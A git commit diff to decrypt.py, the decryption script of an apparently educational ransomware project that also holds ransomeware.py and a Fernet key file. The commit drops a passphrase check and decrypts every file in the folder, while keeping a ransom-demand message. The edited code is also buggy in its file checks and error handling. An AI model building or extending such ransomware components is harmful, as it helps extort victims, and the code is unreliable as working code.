bff89962104d360a8a25e42cf20d1e2514bb0931
Chauhan Shyam <59696796+shyam-chauhan@users.noreply.github.com>
2024-06-12 21:40:40 +0530

    Update decrypt.py
    Code now works for decryption. no need to take input of key as code is already reading it from seckey.key
    Typos fixed and exceptions handled.
    Had fun :)

--- decrypt.py
+++ decrypt.py
@@ -1,33 +1,43 @@
 import os
 from cryptography.fernet import Fernet
 
-
 files = []
+flag = 0
 
 for file in os.listdir():
     
-    if file =='ransomeware.py' or file == 'seckey.key' or file == 'decrpt.py':
-        continue
-    if os.path.isfile(file):
-      files.append(file)
+    if file =='ransomeware.py' or file == 'seckey.key' or file == 'decrypt.py':
+        pass
+    else:
+        os.path.isfile(file)
+        files.append(file)
+    #   print(files)
        
 with open("seckey.key", "rb") as k :
-    secretkey = k.read()
+    secretkey = k.read().strip()
     
-secret_phrase = "Kunj"
+# secret_phrase = "Kunj"
 
-user_entry = input("Enter the secret code to decrypt your files:")
+# user_entry = input("Enter the secret code to decrypt your files:")
 
-if user_entry == secret_phrase:
+# if user_entry == secret_phrase:
     #Logic to decrypt all the files
-    for files in files :
+
+
+for file in files :
+    try:
         with open(file, 'rb') as theFile :
-              with open(file, 'rb') as theFile :
-                   content = theFile.read()
-                   decrpyted_content = Fernet(secretkey).decrypt(content)
-     
+            size = os.path.getsize(file)
+            content = theFile.read(size)
+            decrpyted_content = Fernet(secretkey).decrypt(content)
+
+    except:
+        print("Error !")
     with open(file, 'wb') as theFile :
-          theFile.write(decrpyted_content)
-    print("Great files decrypted")
+        theFile.write(decrpyted_content)
+        flag = 1
+
+if(flag==1):
+    print("Decryption complete")
 else :
     print("Wrong passcode, pay the money to get the right passcode")
